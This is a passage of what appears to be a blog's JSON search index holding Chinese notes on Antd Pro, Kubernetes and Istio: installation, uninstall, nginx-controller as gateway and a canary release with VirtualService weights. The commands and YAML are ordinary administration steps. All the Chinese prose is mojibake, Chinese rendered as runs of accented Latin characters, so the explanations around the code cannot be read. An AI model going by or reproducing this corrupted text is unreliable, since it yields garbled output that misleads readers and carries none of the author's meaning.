#52c41aï¼Œ#1DA57A ","date":"2021-09-26 01:17","objectID":"/post/2675/:1:2","tags":["antd pro","react"],"title":"Antd Proé€ŸæŸ¥","uri":"/post/2675/"},{"categories":["å‰ç«¯"],"content":"å¿«é€Ÿç”Ÿæˆä»£ç å—æ¨¡æ¿ è¾“å…¥rscç„¶åtable,å¿«é€Ÿç”Ÿæˆä»£ç å—æ¨¡æ¿ ","date":"2021-09-26 01:17","objectID":"/post/2675/:1:3","tags":["antd pro","react"],"title":"Antd Proé€ŸæŸ¥","uri":"/post/2675/"},{"categories":["å‰ç«¯"],"content":"proå¸ƒå±€ç»„ä»¶(è¡¨æ ¼å¡ç‰‡ä¹‹ç±»çš„) https://procomponents.ant.design/components ","date":"2021-09-26 01:17","objectID":"/post/2675/:1:4","tags":["antd pro","react"],"title":"Antd Proé€ŸæŸ¥","uri":"/post/2675/"},{"categories":["å‰ç«¯"],"content":"å›¾è¡¨ç»„ä»¶åº“(ç›‘æ§å¿…å¤‡) https://charts.ant.design/zh-CN/demos/global/ è¿™æ˜¯ä¸€ä¸ªæŠ˜çº¿å›¾å–åŒºåŸŸæ ‡è®°çš„ä¾‹å­(å¯ç”¨äºå½“æŸäº›ç›‘æ§æŒ‡æ ‡è¿‡é«˜æ—¶ï¼Œä½¿ç”¨çº¢è‰²æ ‡è®°å‡ºæ¥) annotations: [ { type: 'regionFilter', start: ['start', 'median'], // startæŒ‡å®šèµ·ç‚¹åæ ‡(å‰è€…æ˜¯ä»£è¡¨xè½´ï¼Œåè€…ä»£è¡¨yè½´) end: ['max', 'max'], // endæŒ‡å®šç»ˆç‚¹åæ ‡ã€‚æœ€åå°†èµ·ç‚¹å’Œé‡ç‚¹ä¹‹é—´çš„åŒºåŸŸæ ‡è®°èµ·æ¥ color: '#F4664A', style: { textBaseline: 'bottom'}, }, ","date":"2021-09-26 01:17","objectID":"/post/2675/:1:5","tags":["antd pro","react"],"title":"Antd Proé€ŸæŸ¥","uri":"/post/2675/"},{"categories":["å‰ç«¯"],"content":"ä¿®æ”¹åº•éƒ¨ä¿¡æ¯ src/components/Footer/index.tsx defaultMessage links ","date":"2021-09-26 01:17","objectID":"/post/2675/:1:6","tags":["antd pro","react"],"title":"Antd Proé€ŸæŸ¥","uri":"/post/2675/"},{"categories":["å‰ç«¯"],"content":"å‡½æ•°å†™æ³•è§£é‡Š const DemoLine: React.FC = () =\u003e {} å®šä¹‰ä¸€ä¸ªå¯¹è±¡ä¸ºDemoLineï¼Œç±»å‹ä¸ºReact.FC(React.functionComponent)ã€‚ç±»å‹å¯å†™å¯ä¸å†™ ","date":"2021-09-26 01:17","objectID":"/post/2675/:1:7","tags":["antd pro","react"],"title":"Antd Proé€ŸæŸ¥","uri":"/post/2675/"},{"categories":["kubernetes"],"content":" ns=ingress-nginx kubectl get namespace ${ns} -o json | jq '.spec.finalizers=[]' | kubectl replace --raw /api/v1/namespaces/${ns}/finalize -f - ","date":"2021-09-22 11:23","objectID":"/post/2661/:0:0","tags":["k8s"],"title":"k8så¼ºåˆ¶åˆ é™¤namespace","uri":"/post/2661/"},{"categories":["kubernetes","Istio"],"content":"å‚è€ƒé“¾æ¥: https://www.tetrate.io/blog/using-istio-with-other-ingress-proxies/ annotationè§£é‡Š: https://istio.io/v1.9/zh/docs/reference/config/annotations/ ","date":"2021-09-22 11:07","objectID":"/post/2660/:0:0","tags":["k8s","istio"],"title":"Istioä½¿ç”¨nginx-controllerä½œä¸ºç½‘å…³","uri":"/post/2660/"},{"categories":["kubernetes","Istio"],"content":"Ready æ“ä½œå‰å¤‡ä»½ k get deployments -n ingress-nginx ingress-nginx-controller -o yaml \u003e ingress-nginx-controller.yaml ","date":"2021-09-22 11:07","objectID":"/post/2660/:0:1","tags":["k8s","istio"],"title":"Istioä½¿ç”¨nginx-controllerä½œä¸ºç½‘å…³","uri":"/post/2660/"},{"categories":["kubernetes","Istio"],"content":"ä¸€ã€ä¿®æ”¹nginx-controller podæ³¨è§£ è¿™ä¸€æ­¥çš„ç›®çš„ä¸»è¦æ˜¯å°†å…¥å£æµé‡å®Œå…¨äº¤ç»™nginx,å‡ºå£æµé‡äº¤ç»™envoy(æ’é™¤10.1.0.1,nginxä¸apiserveré€šä¿¡çš„åœ°å€) k edit deployment -n ingress-nginx ingress-nginx-controller traffic.sidecar.istio.io/includeInboundPorts: \"\" # å°†æŒ‡å®šç«¯å£çš„æµé‡é‡å®šå‘åˆ°envoy sidecar traffic.sidecar.istio.io/excludeInboundPorts: \"80,443\" # å°†æŒ‡å®šç«¯å£çš„æµé‡ä¸é‡å®šå‘åˆ°envoy sidecar traffic.sidecar.istio.io/excludeOutboundIPRanges: \"10.1.0.1/32\" # å°†æŒ‡å®šipèŒƒå›´çš„æµå‡ºæµé‡ä¸é‡å®šå‘åˆ°envoy sidecarã€‚`k get svc kubernetes -o jsonpath='{.spec.clusterIP}'` 96565-rkn931fu8s.png ","date":"2021-09-22 11:07","objectID":"/post/2660/:0:2","tags":["k8s","istio"],"title":"Istioä½¿ç”¨nginx-controllerä½œä¸ºç½‘å…³","uri":"/post/2660/"},{"categories":["kubernetes","Istio"],"content":"äºŒã€å°†envoyæ³¨å…¥nginx-controller k get deployments -n ingress-nginx ingress-nginx-controller -o yaml| istioctl kube-inject -f - | k apply -f - å¯ä»¥å°†ä¿®æ”¹åçš„ä¿å­˜ä¸ºyaml k get deployments -n ingress-nginx ingress-nginx-controller -o yaml \u003e ingress-nginx-controller-istio.yaml è¿™é‡Œæˆ‘è¸©äº†ä¸ªå‘ï¼Œä¸€å®šè¦å…ˆæœ‰æ³¨è§£å†è¿›è¡Œæ³¨å…¥ã€‚å¦‚æœå…ˆæ³¨å…¥åœ¨å†™æ³¨è§£ï¼ŒinitContainerä¼šå…ˆç”Ÿæˆï¼Œè¿™æ—¶æ²¡æœ‰æ³¨è§£ï¼Œæ‰€ä»¥ä¸ä¼šç”Ÿæ•ˆæ³¨è§£çš„é…ç½®ã€‚ ","date":"2021-09-22 11:07","objectID":"/post/2660/:0:3","tags":["k8s","istio"],"title":"Istioä½¿ç”¨nginx-controllerä½œä¸ºç½‘å…³","uri":"/post/2660/"},{"categories":["kubernetes","Istio"],"content":"ä¸‰ã€VirtualServiceé…ç½® ä½¿ç”¨nginx-controllerä½œä¸ºç½‘å…³åï¼ŒGatewayèµ„æºåº”è¯¥å°±æ²¡æœ‰ä½œç”¨äº†ã€‚å› ä¸ºnginx-controlleræ˜¯ingress-controllerçš„å®ç°ï¼Œpilotåœ¨watchåˆ°gatewayèµ„æºåä¸ä¼šä¸‹å‘é…ç½®åˆ°nginx-controllerã€‚ æ‰€ä»¥ä¹‹ååœ¨virtualServiceä¸­è¦ä¹ˆä¸å†™gatewaysï¼Œå†™äº†çš„è¯å°±å¾—åŠ ä¸Šä¸€ä¸ªmeshï¼Œæ‰èƒ½ç”Ÿæ•ˆvsçš„è§„åˆ™ spec: gateways: - xxx - mesh hosts: - nginx-svc.istio-demo.svc.cluster.local - nginx-istio.ops.cn ","date":"2021-09-22 11:07","objectID":"/post/2660/:0:4","tags":["k8s","istio"],"title":"Istioä½¿ç”¨nginx-controllerä½œä¸ºç½‘å…³","uri":"/post/2660/"},{"categories":["kubernetes","Istio"],"content":"å››ã€é…ç½®Ingressæµ‹è¯• nginx.ingress.kubernetes.io/service-upstream: \"true\" # é»˜è®¤nginxæ˜¯å°†æµé‡ç›´æ¥æ‰“åˆ°pod ipä¸­çš„,è€Œä¸æ˜¯é€šè¿‡service ipã€‚è¿™ä¸ªé…ç½®ç”¨æ¥ç¦ç”¨å®ƒï¼Œä½¿ä»–çš„æµé‡å‘å¾€service ip nginx.ingress.kubernetes.io/upstream-vhost: \"xxx.default.svc.cluster.local\" # è¿™é‡Œå†™çš„æ˜¯åç«¯Serviceçš„å®Œæ•´fqdnã€‚ç›®çš„æ˜¯ä¿®æ”¹Hostè¯·æ±‚å¤´çš„å€¼ ç»è¿‡ä¸Šé¢çš„é…ç½®,è¯·æ±‚çš„æµé‡å°±èƒ½å’Œvså¯¹è±¡ä¸­é…ç½®çš„hostsåŒ¹é…ä¸Šäº†ã€‚ ä¸‹é¢æ˜¯æµ‹è¯•ä¾‹å­: apiVersion: extensions/v1beta1 kind: Ingress metadata: name: nginx-istio.ops.cn namespace: istio-demo annotations: kubernetes.io/ingress.class: \"nginx\" nginx.ingress.kubernetes.io/service-upstream: \"true\" nginx.ingress.kubernetes.io/upstream-vhost: \"nginx-svc.istio-demo.svc.cluster.local\" spec: rules: - host: nginx-istio.ops.cn http: paths: - path: / backend: serviceName: nginx-svc servicePort: http pathType: Prefix ","date":"2021-09-22 11:07","objectID":"/post/2660/:0:5","tags":["k8s","istio"],"title":"Istioä½¿ç”¨nginx-controllerä½œä¸ºç½‘å…³","uri":"/post/2660/"},{"categories":["kubernetes","Istio"],"content":"äº”ã€æµ‹è¯•æµé‡ é€šè¿‡è®¿é—®nginx-controlleræŸ¥çœ‹virtualserviceè§„åˆ™æ˜¯å¦ç”Ÿæ•ˆ 99556-eecbsqu7vec.png ","date":"2021-09-22 11:07","objectID":"/post/2660/:0:6","tags":["k8s","istio"],"title":"Istioä½¿ç”¨nginx-controllerä½œä¸ºç½‘å…³","uri":"/post/2660/"},{"categories":["kubernetes","Istio"],"content":"å‰è¨€ Istioç‰ˆæœ¬1.9.8 ","date":"2021-09-18 15:29","objectID":"/post/2657/:0:1","tags":["istio"],"title":"Istio1.9 å®‰è£…-operatoræ–¹å¼","uri":"/post/2657/"},{"categories":["kubernetes","Istio"],"content":"ä¸€ã€å®‰è£…istioctl wget https://github.com/istio/istio/releases/download/1.9.8/istio-1.9.8-linux-amd64.tar.gz tar xf istio-1.9.8-linux-amd64.tar.gz cp istio-1.9.8/bin/istioctl /usr/local/bin/ ","date":"2021-09-18 15:29","objectID":"/post/2657/:0:2","tags":["istio"],"title":"Istio1.9 å®‰è£…-operatoræ–¹å¼","uri":"/post/2657/"},{"categories":["kubernetes","Istio"],"content":"äºŒã€å®‰è£…istio operator istioctl operator init æ­¤å‘½ä»¤è¿è¡Œ operator åœ¨ istio-operator å‘½åç©ºé—´ä¸­åˆ›å»ºä»¥ä¸‹èµ„æºï¼š operator CRD crdçš„æ§åˆ¶å™¨ deployment/istio-operator ä¸€ä¸ªserviceï¼Œç”¨äºæš´éœ²istio operatorçš„metrics Istio operatorè¿è¡Œæ‰€å¿…é¡»çš„RBACè§„åˆ™ ","date":"2021-09-18 15:29","objectID":"/post/2657/:0:3","tags":["istio"],"title":"Istio1.9 å®‰è£…-operatoræ–¹å¼","uri":"/post/2657/"},{"categories":["kubernetes","Istio"],"content":"ä¸‰ã€å®‰è£…istio kubectl create ns istio-system kubectl apply -f - \u003c\u003cEOF apiVersion: install.istio.io/v1alpha1 kind: IstioOperator metadata: namespace: istio-system name: istio-controlplane spec: profile: default EOF profileé¢„å®šä¹‰é…ç½®: https://istio.io/v1.9/zh/docs/setup/additional-setup/config-profiles/ profileè‡ªå®šä¹‰é…ç½®: https://istio.io/v1.9/zh/docs/reference/config/istio.operator.v1alpha1/ ä¸åŒé…ç½®çš„åŒºåˆ« è·å–æ¸…å•é…ç½® istioctl manifest generate \u003e default.yaml istioctl manifest generate --set profile=demo \u003e demo.yaml åªè·å–IstioOperatoré…ç½® istioctl profile dump default \u003e default.yaml istioctl profile dump demo \u003e demo.yaml æ€»ä½“æ¥çœ‹ä¸»è¦æ˜¯demoé…ç½®ä¸­å¤šäº†egressgateway configMapâ€“\u003eistio demoé…ç½®ä¸­å¤šå‡ºå¦‚ä¸‹å†…å®¹:accessLogFile: /dev/stdout # å°†æ—¥å¿—è¾“å‡ºåˆ°æ§åˆ¶å°,é»˜è®¤é…ç½®æ˜¯ç¦ç”¨çš„ã€‚` deploymentâ€“\u003eistio-egressgateway demoé…ç½®ä¸­å¤šäº†istio-egressgatewayç»„ä»¶ hpaâ€“\u003eistiodã€ingressgateway defaulté…ç½®æœ‰ä¸¤ä¸ªhpaç›¸å…³çš„é…ç½®.å¯ä»¥åˆ°istio-systemå‘½åç©ºé—´ä¸‹æ‰¾åˆ°istio-ingressgatewayã€istiod ","date":"2021-09-18 15:29","objectID":"/post/2657/:0:4","tags":["istio"],"title":"Istio1.9 å®‰è£…-operatoræ–¹å¼","uri":"/post/2657/"},{"categories":["kubernetes","Istio"],"content":"å››ã€æŸ¥çœ‹å®‰è£…ç»“æœ k get pod -n istio-system k get istiooperators -n istio-system istio-controlplane ","date":"2021-09-18 15:29","objectID":"/post/2657/:0:5","tags":["istio"],"title":"Istio1.9 å®‰è£…-operatoræ–¹å¼","uri":"/post/2657/"},{"categories":["kubernetes","Istio"],"content":"äº”ã€é…ç½®è‡ªåŠ¨æ³¨å…¥ k label namespace default istio-injection=enabled ","date":"2021-09-18 15:29","objectID":"/post/2657/:0:6","tags":["istio"],"title":"Istio1.9 å®‰è£…-operatoræ–¹å¼","uri":"/post/2657/"},{"categories":["Istio"],"content":" # åˆ é™¤å®˜æ–¹ç¤ºä¾‹çš„æ’ä»¶ kubectl delete -f samples/addons # åˆ é™¤istioç»„ä»¶ istioctl manifest generate --set profile=demo | kubectl delete --ignore-not-found=true -f - # åˆ é™¤namespace kubectl delete namespace istio-system # åˆ é™¤ç›¸å…³label kubectl label namespace xxx istio-injection- # åˆ é™¤istio-crd kubectl delete namespace istio-operator ","date":"2021-09-18 15:20","objectID":"/post/2656/:0:0","tags":["istio"],"title":"Istioå¸è½½","uri":"/post/2656/"},{"categories":["kubernetes","Istio"],"content":"ä¸€ã€é…ç½®namespace # åˆ›å»ºns k create ns istio-demo # å¼€å¯è‡ªåŠ¨æ³¨å…¥ k label ns istio-demo istio-injection=enabled ","date":"2021-09-17 19:10","objectID":"/post/2654/:0:1","tags":["istio"],"title":"Istioå®ç°ç®€å•çš„ç°åº¦å‘å¸ƒæµç¨‹","uri":"/post/2654/"},{"categories":["kubernetes","Istio"],"content":"äºŒã€éƒ¨ç½²nginx-v1åº”ç”¨ apiVersion: apps/v1 kind: Deployment metadata: name: nginx-v1 namespace: istio-demo spec: replicas: 1 selector: matchLabels: app: nginx version: v1 template: metadata: labels: app: nginx version: v1 spec: initContainers: - name: busybox image: busybox volumeMounts: - name: www mountPath: /tmp command: [\"sh\", \"-c\", \"echo 'v1' \u003e /tmp/index.html\"] containers: - name: nginx image: nginx:1.14-alpine imagePullPolicy: IfNotPresent ports: - name: http containerPort: 80 volumeMounts: - name: www mountPath: /usr/share/nginx/html/ volumes: - name: www emptyDir: {} æ³¨æ„è¿™é‡Œçš„æ ‡ç­¾ä½¿ç”¨äº†app=nginxï¼Œversion=v1 ","date":"2021-09-17 19:10","objectID":"/post/2654/:0:2","tags":["istio"],"title":"Istioå®ç°ç®€å•çš„ç°åº¦å‘å¸ƒæµç¨‹","uri":"/post/2654/"},{"categories":["kubernetes","Istio"],"content":"ä¸‰ã€åˆ›å»ºService apiVersion: v1 kind: Service metadata: name: nginx-svc namespace: istio-demo spec: type: ClusterIP ports: - name: http port: 80 targetPort: 80 selector: app: nginx è¿™é‡Œé€‰æ‹©æ‰€æœ‰app=nginxçš„pod ","date":"2021-09-17 19:10","objectID":"/post/2654/:0:3","tags":["istio"],"title":"Istioå®ç°ç®€å•çš„ç°åº¦å‘å¸ƒæµç¨‹","uri":"/post/2654/"},{"categories":["kubernetes","Istio"],"content":"å››ã€åˆ›å»ºGateway å…è®¸è®¿é—®nginx-istio.ops.cnçš„å¤–éƒ¨æµé‡ apiVersion: networking.istio.io/v1alpha3 kind: Gateway metadata: name: nginx-gw namespace: istio-demo spec: selector: # è¿™é‡Œä½¿ç”¨çš„æ˜¯istioçš„é»˜è®¤ç½‘å…³,åé¢ä¼šä»‹ç»ä½¿ç”¨nginx-controllerä½œä¸ºç½‘å…³ istio: ingressgateway servers: - port: number: 80 name: http protocol: HTTP hosts: - \"nginx-istio.ops.cn\" ","date":"2021-09-17 19:10","objectID":"/post/2654/:0:4","tags":["istio"],"title":"Istioå®ç°ç®€å•çš„ç°åº¦å‘å¸ƒæµç¨‹","uri":"/post/2654/"},{"categories":["kubernetes","Istio"],"content":"äº”ã€åˆ›å»ºVirtualService å°†nginxæœåŠ¡çš„æµé‡éƒ½èµ°å‘v1ç‰ˆæœ¬ apiVersion: networking.istio.io/v1alpha3 kind: VirtualService metadata: name: nginx-vs namespace: istio-demo spec: exportTo: - \"*\" gateways: - nginx-gw hosts: - 'nginx-svc.istio-demo.svc.cluster.local' - 'nginx-istio.ops.cn' http: - route: - destination: host: nginx-svc subset: v1 weight: 100 - destination: host: nginx-svc subset: v2 ","date":"2021-09-17 19:10","objectID":"/post/2654/:0:5","tags":["istio"],"title":"Istioå®ç°ç®€å•çš„ç°åº¦å‘å¸ƒæµç¨‹","uri":"/post/2654/"},{"categories":["kubernetes","Istio"],"content":"å…­ã€é…ç½®DestinationRule ä¸ºnginx-svcå®šä¹‰ä¸¤ä¸ªå­é›† apiVersion: networking.istio.io/v1alpha3 kind: DestinationRule metadata: name: nginx-dr namespace: istio-demo spec: host: nginx-svc subsets: - name: v1 labels: version: v1 - name: v2 labels: version: v2 ","date":"2021-09-17 19:10","objectID":"/post/2654/:0:6","tags":["istio"],"title":"Istioå®ç°ç®€å•çš„ç°åº¦å‘å¸ƒæµç¨‹","uri":"/post/2654/"},{"categories":["kubernetes","Istio"],"content":"ä¸ƒã€è®¿é—®æµ‹è¯• è·å–nodeportç«¯å£ k get svc -n istio-system istio-ingressgateway -o jsonpath='{.spec.ports[?(@.name==\"http2\")].nodePort}' http://nginx-istio.ops.cn:32629/ ","date":"2021-09-17 19:10","objectID":"/post/2654/:0:7","tags":["istio"],"title":"Istioå®ç°ç®€å•çš„ç°åº¦å‘å¸ƒæµç¨‹","uri":"/post/2654/"},{"categories":["kubernetes","Istio"],"content":"å…«ã€éƒ¨ç½²nginx-v2ç°åº¦ç‰ˆæœ¬ apiVersion: apps/v1 kind: Deployment metadata: name: nginx-v2 namespace: istio-demo spec: replicas: 1 selector: matchLabels: app: nginx version: v2 template: metadata: labels: app: nginx version: v2 spec: initContainers: - name: busybox image: busybox volumeMounts: - name: www mountPath: /tmp command: [\"sh\", \"-c\", \"echo 'v2' \u003e /tmp/index.html\"] containers: - name: nginx image: nginx:1.14-alpine imagePullPolicy: IfNotPresent ports: - name: http containerPort: 80 volumeMounts: - name: www mountPath: /usr/share/nginx/html/ volumes: - name: www emptyDir: {} ç›®å‰ä¸ºæ­¢æµé‡è¿˜éƒ½åœ¨v1ä¸Š ","date":"2021-09-17 19:10","objectID":"/post/2654/:0:8","tags":["istio"],"title":"Istioå®ç°ç®€å•çš„ç°åº¦å‘å¸ƒæµç¨‹","uri":"/post/2654/"},{"categories":["kubernetes","Istio"],"content":"ä¹ã€åˆ‡10%çš„æµé‡åˆ°v2ç‰ˆæœ¬ apiVersion: networking.istio.io/v1alpha3 kind: VirtualService metadata: name: nginx-vs namespace: istio-demo spec: exportTo: - \"*\" gateways: - nginx-gw hosts: - 'nginx-svc.istio-demo.svc.cluster.local' - 'nginx-istio.ops.cn' http: - route: - destination: host: nginx-svc subset: v1 weight: 90 - destination: host: nginx-svc subset: v2 weight: 10 ","date":"2021-09-17 19:10","objectID":"/post/2654/:0:9","tags":["istio"],"title":"Istioå®ç°ç®€å•çš„ç°åº¦å‘å¸ƒæµç¨‹","uri":"/post/2654/"},{"categories":["kubernetes","Istio"],"content":"åã€è®¿é—®æµ‹è¯• è®¿é—®100æ¬¡è¿›è¡Œæµ‹è¯• for i in {1..100};do curl -s http://nginx-istio.ops.cn:32629 ;done | sort | uniq -c 20480-xcs0fp8hwua.png ","date":"2021-09-17 19:10","objectID":"/post/2654/:0:10","tags":["istio"],"title":"Istioå®ç°ç®€å•çš„ç°åº¦å‘å¸ƒæµç¨‹","uri":"/post/2654/"},{"categories":["kubernetes","Istio"],"content":"Istioå­¦ä¹ ç¬”è®° ","date":"2021-09-12 01:04","objectID":"/post/2648/:0:0","tags":["k8s","istio"],"title":"Istioå­¦ä¹ ç¬”è®°","uri":"/post/2648/"},{"categories":["kubernetes","Istio"],"content":"æ¶æ„æ¦‚è¿° ","date":"2021-09-12 01:04","objectID":"/post/2648/:1:0","tags":["k8s","istio"],"title":"Istioå­¦ä¹ ç¬”è®°","uri":"/post/2648/"},{"categories":["kubernetes","Istio"],"content":"æ•°æ®å¹³é¢ Envoy è¢«éƒ¨ç½²ä¸ºsidecarã€‚å‘é€åˆ°ä¸šåŠ¡å®¹å™¨çš„è¯·æ±‚éƒ½å°†ä¼šè½¬å‘åˆ°envoyçš„ç«¯å£ä¸­(é€šè¿‡iptables natè§„åˆ™)ã€‚ envoyæ”¯æŒåŠ¨æ€é…ç½®ï¼Œä¾‹å¦‚ç›‘å¬ç«¯å£ã€è·¯ç”±è§„åˆ™ã€æœåŠ¡å‘ç° ","date":"2021-09-12 01:04","objectID":"/post/2648/:1:1","tags":["k8s","istio"],"title":"Istioå­¦ä¹ ç¬”è®°","uri":"/post/2648/"},{"categories":["kubernetes","Istio"],"content":"æ§åˆ¶å¹³é¢ 1.5ä¹‹å‰çš„ç‰ˆæœ¬istioé‡‡ç”¨å¾®æœåŠ¡æ¶æ„ï¼Œ1.5ä¹‹åistioå›å½’å•ä½“åº”ç”¨,æ§åˆ¶å¹³é¢çš„ç»„ä»¶éƒ½åœ¨istiodä¸­ Pilot ç®¡ç†å’Œé…ç½®envoy sidecar ä¸ºEnvoy sidecaræä¾›æœåŠ¡å‘ç°ã€æ™ºèƒ½è·¯ç”±ã€æµé‡ç®¡ç†çš„åŠŸèƒ½é…ç½®ï¼ˆä¾‹å¦‚ï¼ŒA/B æµ‹è¯•ã€é‡‘ä¸é›€å‘å¸ƒç­‰ï¼‰ä»¥åŠå¼¹æ€§åŠŸèƒ½é…ç½®ï¼ˆè¶…æ—¶ã€é‡è¯•ã€ç†”æ–­å™¨ç­‰ï¼‰ã€‚ Citadel å®ç°æœåŠ¡åˆ°æœåŠ¡ä¹‹é—´çš„èº«ä»½è®¤è¯(æ¯”å¦‚åŒå‘æ•°å­—è¯ä¹¦) Galley æä¾›istioä¸­çš„é…ç½®ç®¡ç†æœåŠ¡,éªŒè¯Istioçš„CRDèµ„æºçš„åˆæ³•æ€§. ","date":"2021-09-12 01:04","objectID":"/post/2648/:1:2","tags":["k8s","istio"],"title":"Istioå­¦ä¹ ç¬”è®°","uri":"/post/2648/"},{"categories":["kubernetes","Istio"],"content":"æµé‡ç®¡ç† istioä¼šè‡ªåŠ¨æ£€æµ‹k8s service å’Œ endpoint,enovyä»£ç†é»˜è®¤é€šè¿‡è½®è¯¢çš„æ–¹å¼åˆ†å‘æµé‡ã€‚ä¹Ÿå¯ä»¥å¯¹æµé‡è¿›è¡Œæ›´ç»†ç²’åº¦çš„æ§åˆ¶ã€‚å¦‚A/Bæµ‹è¯•ã€æŒ‰ç…§æµé‡ç™¾åˆ†æ¯”ã€ä¸ºç‰¹å®šçš„æœåŠ¡å®ä¾‹å­é›†åº”ç”¨ä¸åŒçš„è´Ÿè½½å‡è¡¡ç­–ç•¥ã€å¯¹æµé‡è¿›å‡ºçš„æ§åˆ¶ï¼Œè¿™äº›éƒ½å¯ä»¥ç”±Istio Apiæ¥é…ç½®ã€‚ ","date":"2021-09-12 01:04","objectID":"/post/2648/:2:0","tags":["k8s","istio"],"title":"Istioå­¦ä¹ ç¬”è®°","uri":"/post/2648/"},{"categories":["kubernetes","Istio"],"content":"æµé‡ç®¡ç†ç›¸å…³API VirtualService: vså®šä¹‰å‘½ä¸­ä»€ä¹ˆè§„åˆ™è®¿é—®ä»€ä¹ˆæœåŠ¡(k8s service)ã€‚ æ¯”å¦‚åŒ¹é…uriå‰ç¼€/aaaè®¿é—®AæœåŠ¡ï¼ŒåŒ¹é…/bbbè®¿é—®BæœåŠ¡ã€‚è¿™é‡Œå®šä¹‰çš„å†…å®¹å°†ä¼šè¢«istiod(pilotç»„ä»¶)é€šè¿‡apiserverç›‘å¬åˆ°ï¼Œæœ€åè½¬æ¢ä¸ºenvoyé…ç½®ï¼Œä¸‹å‘ç»™envoy sidecar ç”±ä¸€ç»„è·¯ç”±è§„åˆ™ç»„æˆï¼Œç”¨äºåŒ¹é…åç«¯æœåŠ¡ã€‚å¦‚æœæœ‰æµé‡å‘½ä¸­äº†æŸæ¡è·¯ç”±è§„åˆ™ï¼Œå°±ä¼šå°†å…¶å‘é€åˆ°å¯¹åº”çš„æœåŠ¡æˆ–è€…æœåŠ¡çš„ä¸€ä¸ªç‰ˆæœ¬ä¸­ã€‚ å®˜æ–¹APIæ–‡æ¡£: https://istio.io/v1.9/zh/docs/reference/config/networking/virtual-service/ ç¤ºä¾‹: apiVersion: networking.istio.io/v1alpha3 kind: VirtualService metadata: name: reviews spec: exportTo: # è¡¨ç¤ºå½“å‰vsçš„é…ç½®å¯¹å“ªäº›å‘½åç©ºé—´ç”Ÿæ•ˆ,é»˜è®¤æ˜¯æ‰€æœ‰ã€‚åœ¨1.9ç‰ˆæœ¬ä¸­åªèƒ½å†™`.` or `*`. è¡¨ç¤ºå½“å‰å’Œæ‰€æœ‰å‘½åç©ºé—´ - \"*\" hosts: # ä¸€ä¸ªåˆ—è¡¨ï¼ŒæŒ‡å®šæœåŠ¡ç«¯çš„è®¿é—®åœ°å€ã€‚å¯ä»¥æ˜¯IPã€åŸŸå(åŒ…æ‹¬service)ã€‚`*`ä»£è¡¨åŒ¹é…æ‰€æœ‰ã€‚(æš‚æ—¶ç†è§£ä¸ºnginxçš„server_name--\u003eå‡çº§ç†è§£:å½“å‰è§„åˆ™ä½œç”¨åœ¨å“ªä¸ªè®¿é—®åœ°å€ä¸Š) - reviews http: # å®šä¹‰è·¯ç”±è§„åˆ™çš„æ–¹å¼ï¼Œå¯ä»¥æ˜¯httpã€tcpã€tls - match: # å®šä¹‰åŒ¹é…è§„åˆ™ - headers: # åŒ¹é…headerã€‚å…¶ä»–é€‰é¡¹è¯·ç§»æ­¥https://istio.io/v1.9/zh/docs/reference/config/networking/virtual-service/#HTTPMatchRequest end-user: # headerçš„key exact: jason # ä½¿ç”¨ç²¾ç¡®åŒ¹é…,åŒ¹é…çš„valueæ˜¯jasonã€‚ä¹Ÿå¯ä»¥å†™prefixã€regexåŒ¹é… route: # è¿™é‡ŒæŒ‡å®šè·¯ç”±,ä¸Šé¢çš„è§„åˆ™åŒ¹é…æˆåŠŸåè®¿é—®çš„å®é™…backend - destination: host: reviews # è¿™é‡ŒæŒ‡å®šçš„æ˜¯serviceåç§° ç®€å†™å’Œå®Œæ•´çš„éƒ½å¯ä»¥ subset: v2 # è¿™é‡Œè¡¨ç¤ºä½¿ç”¨serviceçš„v2å­é›†ã€‚serviceçš„å­é›†éœ€è¦åœ¨DestinationRuleä¸­é…ç½®ã€‚ä½¿ç”¨subsetæ—¶,å¿…é¡»è¦æœ‰DestinationRule,å¦åˆ™ä¼š503 - route: # è¿™é‡Œæ˜¯ç¬¬äºŒæ¡è§„åˆ™,è§„åˆ™æ˜¯ç©ºçš„,æ‰€ä»¥å½“ç¬¬ä¸€æ¡è§„åˆ™ä¸åŒ¹é…æ—¶ï¼Œæµé‡ä¼šç›´æ¥è¿›å…¥reviews v3å­é›† - destination: host: reviews subset: v3 ä¸Šé¢ç¤ºä¾‹çš„æ•´ä½“å«ä¹‰: å°†è§„åˆ™ä½œç”¨åˆ°reviewsè¿™ä¸ªserviceä¸Šï¼ŒåŒ¹é…headerä¸­end-useræ˜¯jasonçš„è¯·æ±‚ï¼Œå°†å®ƒè·¯ç”±åˆ°reviewsæœåŠ¡çš„v2å­é›†ä¸­ã€‚å…¶ä»–è¯·æ±‚è¿›å…¥reviews v3å­é›†ã€‚é…ç½®ä»…å¯¹ç½‘æ ¼å†…ç”Ÿæ•ˆ(è¢«æ³¨å…¥çš„pdo)ï¼Œå¤–éƒ¨æµé‡è¿›æ¥è¿˜æ˜¯æŒ‰ç…§k8sçš„æµé‡è·¯çº¿èµ°ã€‚(å¯¹å¤–ç”Ÿæ•ˆå¯èƒ½éœ€è¦é…ç½®gateways,åç»­å­¦ä¹ æµ‹è¯•) å»ºè®®æ·»åŠ ä¸€ä¸ªæ— æ¡ä»¶æˆ–è€…åŸºäºæƒé‡çš„è§„åˆ™,ä½œä¸ºVirtualServiceçš„æœ€åä¸€æ¡è§„åˆ™,ä»è€Œç¡®ä¿æµé‡è‡³å°‘èƒ½åŒ¹é…ä¸€æ¡è·¯ç”±è§„åˆ™ã€‚ æ€»ç»“: VirtualServiceæŒ‡å®šåŒ¹é…è§„åˆ™ï¼Œå°†åŒ¹é…çš„è§„åˆ™è·¯ç”±åˆ°ä¸åŒçš„æœåŠ¡æˆ–ä¸åŒæœåŠ¡çš„å­é›†ã€‚ vsåŠŸèƒ½åˆ—ä¸¾: æ•…éšœæ³¨å…¥ã€è®¾ç½®è·¨åŸŸç­–ç•¥ã€è®¾ç½®è¯·æ±‚å¤´ã€æµé‡é•œåƒã€é‡è¯•ç­–ç•¥ã€é‡å®šå‘ã€urlé‡å†™ã€åŒ¹é…è§„åˆ™ã€è·¯ç”±ã€ çŒœæƒ³: vsæ§åˆ¶çš„æ˜¯envoy sidecarçš„é…ç½®ï¼Œ gatewayæ§åˆ¶çš„æ˜¯istio-ingressgatewayçš„é…ç½® DestinationRule åœ¨ç»è¿‡vsè·¯ç”±æ—¶,å¦‚æœé…ç½®äº†subsetåˆ™ä¼šéµå¾ªDestinationRuleé…ç½®çš„æµé‡æ‰§è¡Œç­–ç•¥ï¼Œå¦‚serviceçš„å­é›†ã€ç†”æ–­ã€è´Ÿè½½å‡è¡¡ç­–ç•¥ã€è¿æ¥æ± å¤§å° å’Œ 